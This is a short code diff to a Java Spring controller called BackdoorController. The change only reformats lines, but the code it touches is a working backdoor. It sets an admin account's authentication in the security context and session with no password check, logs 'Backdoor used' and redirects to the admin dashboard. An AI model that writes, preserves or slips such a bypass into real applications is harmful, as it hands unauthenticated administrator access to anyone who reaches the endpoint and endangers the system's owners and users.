@@ -26,20 +26,18 @@ public class BackdoorController {
         if (adminOpt.isPresent()) {
             Account admin = adminOpt.get();
             GrantedAuthority authority = new SimpleGrantedAuthority("ROLE_ADMIN");
-            
-            org.springframework.security.core.userdetails.User userDetails = 
-                new org.springframework.security.core.userdetails.User(
+
+            org.springframework.security.core.userdetails.User userDetails = new org.springframework.security.core.userdetails.User(
                     admin.getUsername(),
                     admin.getPasswordHash(),
-                    Collections.singletonList(authority)
-                );
+                    Collections.singletonList(authority));
 
-            UsernamePasswordAuthenticationToken authReq = 
-                new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
-            
+            UsernamePasswordAuthenticationToken authReq = new UsernamePasswordAuthenticationToken(userDetails, null,
+                    userDetails.getAuthorities());
+
             SecurityContextHolder.getContext().setAuthentication(authReq);
             request.getSession().setAttribute("SPRING_SECURITY_CONTEXT", SecurityContextHolder.getContext());
-            
+
             System.out.println("🚀 Backdoor used: Admin logged in manually!");
             return "redirect:/admin/dashboard";
         }
